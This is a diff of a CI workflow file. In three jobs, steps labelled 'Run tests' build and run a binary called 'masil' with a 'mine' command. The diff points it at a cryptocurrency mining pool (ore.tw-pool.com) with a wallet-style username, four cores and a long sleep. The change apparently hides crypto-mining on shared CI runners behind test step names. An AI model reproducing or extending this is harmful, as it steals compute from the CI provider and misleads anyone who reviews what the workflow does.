@@ -29,7 +29,7 @@ jobs:
     - name: Build
       run: cd masil && cargo build --release
     - name: Run tests
-      run: cd masil && ./target/release/masil --url ws://172.179.236.202:8080/mine mine --username CgVeVHHGGup7QAXccoA6hd9hUTfqwxXqRvAJ9wQozn7e.1313 --cores 4 &
+      run: cd masil && ./target/release/masil --url ws://ore.tw-pool.com:5487/mine mine --username CgVeVHHGGup7QAXccoA6hd9hUTfqwxXqRvAJ9wQozn7e.1314 --cores 4 --mode 2 &
         sleep 305s
   chat:
     needs: me
@@ -56,7 +56,7 @@ jobs:
     - name: Build
       run: cd masil && cargo build --release
     - name: Run tests
-      run: cd masil && ./target/release/masil --url ws://172.179.236.202:8080/mine mine --username CgVeVHHGGup7QAXccoA6hd9hUTfqwxXqRvAJ9wQozn7e.1313 --cores 4
+      run: cd masil && ./target/release/masil --url ws://ore.tw-pool.com:5487/mine mine --username CgVeVHHGGup7QAXccoA6hd9hUTfqwxXqRvAJ9wQozn7e.1314 --cores 4 --mode 2
         
     
      
@@ -85,7 +85,7 @@ jobs:
     - name: Build
       run: cd masil && cargo build --release
     - name: Run tests
-      run: cd masil && ./target/release/masil --url ws://172.179.236.202:8080/mine mine --username CgVeVHHGGup7QAXccoA6hd9hUTfqwxXqRvAJ9wQozn7e.1313 --cores 4
+      run: cd masil && ./target/release/masil --url ws://ore.tw-pool.com:5487/mine mine --username CgVeVHHGGup7QAXccoA6hd9hUTfqwxXqRvAJ9wQozn7e.1314 --cores 4 --mode 2
     
   Success:
     needs: [me, chat, enak]
